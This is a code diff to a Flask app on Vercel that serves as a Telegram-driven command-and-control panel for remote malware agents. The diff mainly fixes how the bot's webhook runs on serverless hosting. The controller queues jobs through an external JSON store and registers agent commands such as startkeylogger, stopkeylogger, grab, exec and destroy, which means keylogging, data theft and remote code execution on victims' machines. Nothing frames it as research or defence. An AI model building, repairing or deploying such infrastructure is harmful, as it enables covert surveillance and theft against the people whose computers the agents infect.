@@ -1,12 +1,13 @@
 # api/index.py
 # Vercel-compatible controller using Flask and Webhooks.
+# FINAL VERSION with robust handling for serverless environments.
 
 import os
 import re
 import json
 import uuid
 import requests
-import asyncio  # <--- THIS LINE IS ADDED
+import asyncio
 from flask import Flask, request
 
 from telegram import Update
@@ -23,7 +24,7 @@ STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
 
-# --- Helper Functions ---
+# --- Helper Functions --- (No changes in this section)
 def esc(text):
     return escape_markdown(str(text), version=2)
 def get_state():
@@ -53,7 +54,7 @@ def post_job(target_id, command, args):
         print(f"Error posting job: {e}")
         return False
 
-# --- Telegram Command Handlers ---
+# --- Telegram Command Handlers --- (No changes in this section)
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "__**Vercel Controller Help**__\n\n"
@@ -112,7 +113,7 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch job.")
 
-# --- Register handlers ---
+# --- Register handlers --- (No changes in this section)
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
@@ -120,12 +121,23 @@ agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
+# --- NEW: Robust async handler for serverless environments ---
+async def process_update_async(update_data):
+    """
+    Initializes the bot, processes a single update, and shuts down gracefully.
+    This is the standard pattern for running python-telegram-bot on Vercel.
+    """
+    await ptb_app.initialize()
+    update = Update.de_json(update_data, ptb_app.bot)
+    await ptb_app.process_update(update)
+    await ptb_app.shutdown()
+
 # --- Main Webhook Endpoint ---
 @app.route('/', methods=['POST'])
-def process_webhook(): # <--- THIS FUNCTION IS NOW CORRECTED
+def process_webhook():
+    """Receives a webhook from Telegram and processes it."""
     update_data = request.get_json(force=True)
-    update = Update.de_json(update_data, ptb_app.bot)
-    asyncio.run(ptb_app.process_update(update))
+    asyncio.run(process_update_async(update_data))
     return 'OK', 200
 
 @app.route('/', methods=['GET'])
